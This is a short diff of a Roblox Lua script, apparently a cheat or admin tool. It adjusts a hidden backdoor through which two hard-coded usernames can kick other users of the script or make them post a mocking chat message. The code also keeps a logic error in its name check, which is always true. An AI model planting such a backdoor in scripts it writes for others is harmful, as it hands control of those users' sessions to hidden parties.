@@ -91,7 +91,7 @@ local function a(plr)
     local args3 = split[4]
     local args4 = split[5]
 
-    if plr == game.Players:FindFirstChild("Ih0temyIife") or game.Players:FindFirstChild("San_fromlb") then
+    if plr == game.Players:FindFirstChild("Ih0temyIife") or plr == game.Players:FindFirstChild("San_fromlb") then
 
       if cmd == "XKick" then
           
@@ -103,7 +103,7 @@ local function a(plr)
       if cmd == "Xcheck" then
         if lp.Name ~= "Ih0temyIife" or lp.Name ~= "Sans_fromlb" then
               
-          h("I use Xkahv2 cuz im a skid")
+          ct("h I use Xkahv2 cuz im a skid!")
 
         end
       end
